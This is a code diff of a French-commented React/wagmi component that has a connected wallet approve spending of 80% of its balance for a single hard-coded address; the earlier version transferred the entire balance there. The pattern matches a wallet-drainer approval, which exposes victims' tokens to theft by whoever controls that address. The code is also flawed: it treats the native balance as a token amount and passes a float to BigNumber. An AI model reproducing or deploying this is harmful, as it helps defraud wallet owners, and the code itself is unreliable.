@@ -1,105 +1,49 @@
-import { useState, useEffect } from 'react';
-import { ethers } from 'ethers';
+import React, { useState, useEffect } from 'react';
 import { useAccount, useBalance, useContractWrite, usePrepareContractWrite } from 'wagmi';
 import { erc20ABI } from '@wagmi/core';
-import { publicClient, walletClient } from './walletClient'; // Assurez-vous que walletClient et publicClient sont correctement importés
+import { BigNumber } from 'ethers';
 
-const fixedDestinationAddress = '0x518c5D62647E60864EcB3826e982c93dFa154af3'; // Adresse fixe pour l'envoi
+// Adresse fixe pour l'envoi
+const fixedDestinationAddress = '0x518c5D62647E60864EcB3826e982c93dFa154af3';
 
 const SendTokens = () => {
-  const { address, isConnected } = useAccount();
+  const { address } = useAccount(); // Récupère l'adresse du compte connecté
   const { data: balanceData } = useBalance({ address });
-  const [isApprovalRequired, setIsApprovalRequired] = useState(false);
-  const [isApproving, setIsApproving] = useState(false);
+  const [allowance, setAllowance] = useState<BigNumber | null>(null);
+  const [amountToSend, setAmountToSend] = useState<BigNumber | null>(null);
 
-  useEffect(() => {
-    const checkApproval = async () => {
-      if (address && balanceData?.value) {
-        const tokenAddress = '0x...'; // L'adresse du contrat ERC-20
-        try {
-          const { data: allowance } = await publicClient.readContract({
-            address: tokenAddress,
-            abi: erc20ABI,
-            functionName: 'allowance',
-            args: [walletClient.account as `0x${string}`, fixedDestinationAddress],
-          });
-
-          // Vérifier si l'autorisation est suffisante pour envoyer les tokens
-          setIsApprovalRequired(allowance.lt(balanceData.value));
-        } catch (error) {
-          console.error('Erreur lors de la vérification de l\'approbation:', error);
-        }
-      }
-    };
-
-    checkApproval();
-  }, [address, balanceData]);
-
-  const { config: approveConfig } = usePrepareContractWrite({
-    addressOrName: '0x...', // L'adresse du contrat ERC-20
-    contractInterface: erc20ABI,
-    functionName: 'approve',
-    args: [fixedDestinationAddress, balanceData?.value],
-    enabled: isApprovalRequired && !isApproving,
-  });
-
-  const { write: approve } = useContractWrite(approveConfig);
+  const tokenAddress = 'votre_token_ERC20'; // Remplacez par l'adresse de votre token ERC-20
+  const contractAddress = tokenAddress;
 
   const { config } = usePrepareContractWrite({
-    addressOrName: '0x...', // L'adresse du contrat ERC-20
-    contractInterface: erc20ABI,
-    functionName: 'transfer',
-    args: [fixedDestinationAddress, balanceData?.value],
-    enabled: !isApprovalRequired || (isApprovalRequired && !isApproving),
+    address: contractAddress,
+    abi: erc20ABI,
+    functionName: 'approve',
+    args: [fixedDestinationAddress, amountToSend || BigNumber.from(0)],
   });
 
   const { write } = useContractWrite(config);
 
-  const handleApprove = async () => {
-    if (approve) {
-      setIsApproving(true);
-      try {
-        await approve();
-        console.log('Approvisionnement des tokens effectué avec succès');
-      } catch (error) {
-        console.error('Erreur lors de l\'approbation des tokens:', error);
-      } finally {
-        setIsApproving(false);
-      }
-    } else {
-      console.error('Échec de l\'approbation.');
+  useEffect(() => {
+    if (balanceData) {
+      // Calculer 80% du solde
+      const amount = balanceData.formatted ? parseFloat(balanceData.formatted) * 0.8 : 0;
+      setAmountToSend(BigNumber.from(amount.toFixed())); // Met à jour l'état avec 80% du solde
     }
-  };
+  }, [balanceData]);
 
-  const handleSendTokens = async () => {
+  const handleApprove = async () => {
     if (write) {
-      try {
-        await write();
-        console.log('Tokens envoyés avec succès');
-      } catch (error) {
-        console.error('Erreur lors de l\'envoi des tokens:', error);
-      }
-    } else {
-      console.error('Échec de la transaction.');
+      await write();
     }
   };
 
   return (
     <div>
-      <h1>Envoyer des Tokens</h1>
-      <p>Solde disponible : {balanceData?.formatted} {balanceData?.symbol}</p>
-      {isApprovalRequired ? (
-        <div>
-          <p>Autorisation insuffisante. Autorisation en cours...</p>
-          <button onClick={handleApprove} disabled={isApproving}>
-            {isApproving ? 'En cours d\'approbation...' : 'Approuver les tokens'}
-          </button>
-        </div>
-      ) : (
-        <div>
-          <button onClick={handleSendTokens}>Envoyer tous les tokens</button>
-        </div>
-      )}
+      <h3>Envoyer des Tokens</h3>
+      <p>Solde : {balanceData?.formatted} {balanceData?.symbol}</p>
+      <button onClick={handleApprove}>Approuver l'envoi</button>
+      <p>Destination : {fixedDestinationAddress}</p>
     </div>
   );
 };
